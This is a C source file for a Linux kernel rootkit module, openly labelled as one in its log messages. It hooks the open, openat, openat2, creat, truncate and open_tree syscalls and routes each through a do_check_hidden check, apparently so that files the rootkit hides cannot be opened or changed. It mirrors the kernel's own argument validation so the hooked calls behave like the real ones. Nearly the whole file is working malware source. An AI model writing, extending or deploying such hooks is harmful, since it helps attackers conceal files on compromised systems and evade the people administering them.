#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <asm-generic/errno-base.h>
#include <asm/current.h>
#include <linux/capability.h>
#include <linux/fcntl.h>
#include <linux/openat2.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <uapi/linux/mount.h>

// Taken from fs/mount.h
struct mnt_namespace {
    struct ns_common ns;
    struct mount *root;
    /*
	 * Traversal and modification of .list is protected by either
	 * - taking namespace_sem for write, OR
	 * - taking namespace_sem for read AND taking .ns_lock.
	 */
    struct list_head list;
    spinlock_t ns_lock;
    struct user_namespace *user_ns;
    struct ucounts *ucounts;
    u64 seq; /* Sequence number to prevent loops */
    wait_queue_head_t poll;
    u64 event;
    unsigned int mounts; /* # of mounts in the namespace */
    unsigned int pending_mounts;
} __randomize_layout;

// Taken from fs/namespace.c:1720
/*
 * Is the caller allowed to modify his namespace?
 */
static inline bool may_mount(void)
{
    return ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN);
}

// sys_open syscall hook handler
SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] open(%p, %s%#x, %#ho)\n", s_filename, SIGNED_ARG(i32_flags), ui16_mode);

    return do_check_hidden(orig_open, p_regs, AT_FDCWD, s_filename,
                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_openat syscall hook handler
SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
                      int, i32_flags, umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] openat(%d, %p, %s%#x, %#ho)\n", i32_dfd, s_filename, SIGNED_ARG(i32_flags),
            ui16_mode);

    return do_check_hidden(orig_openat, p_regs, i32_dfd, s_filename,
                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_openat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __user *, s_filename,
                      struct open_how __user *, p_how, size_t, sz_usize)
{
    int err;
    struct open_how tmp_how;

    pr_info("[ROOTKIT] openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);

    // Following code is based on fs/open.c:sys_openat2()

    IF_U (sz_usize < OPEN_HOW_SIZE_VER0) {
        return -EINVAL;
    }

    err = copy_struct_from_user(&tmp_how, sizeof(tmp_how), p_how, sz_usize);
    if (err != 0) {
        return err;
    }

    return do_check_hidden(orig_openat2, p_regs, i32_dfd, s_filename,
                           tmp_how.flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_creat syscall hook handler
SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename, umode_t,
                      ui16_mode)
{
    pr_info("[ROOTKIT] creat(%p, %#ho)\n", s_filename, ui16_mode);

    return do_check_hidden(orig_creat, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_truncate syscall hook handler
SYSCALL_HOOK_HANDLER2(truncate, orig_truncate, p_regs, const char __user *, s_filename, long,
                      i64_length)
{
    pr_info("[ROOTKIT] truncate(%p, %ld)\n", s_filename, i64_length);

    return do_check_hidden(orig_truncate, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_open_tree syscall hook handler
SYSCALL_HOOK_HANDLER3(open_tree, orig_open_tree, p_regs, int, i32_dfd, const char __user *,
                      s_filename, unsigned int, ui32_flags)
{
    pr_info("[ROOTKIT] open_tree(%d, %p, %#x)\n", i32_dfd, s_filename, ui32_flags);

    // Following code is based on fs/namespace.c:2471
    if (ui32_flags & ~(AT_EMPTY_PATH | AT_NO_AUTOMOUNT | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW |
                       OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC)) {
        return -EINVAL;
    }

    if ((ui32_flags & (AT_RECURSIVE | OPEN_TREE_CLONE)) == AT_RECURSIVE) {
        return -EINVAL;
    }

    if ((ui32_flags & OPEN_TREE_CLONE) && !may_mount()) {
        return -EPERM;
    }

    return do_check_hidden(orig_open_tree, p_regs, i32_dfd, s_filename, ui32_flags);
}
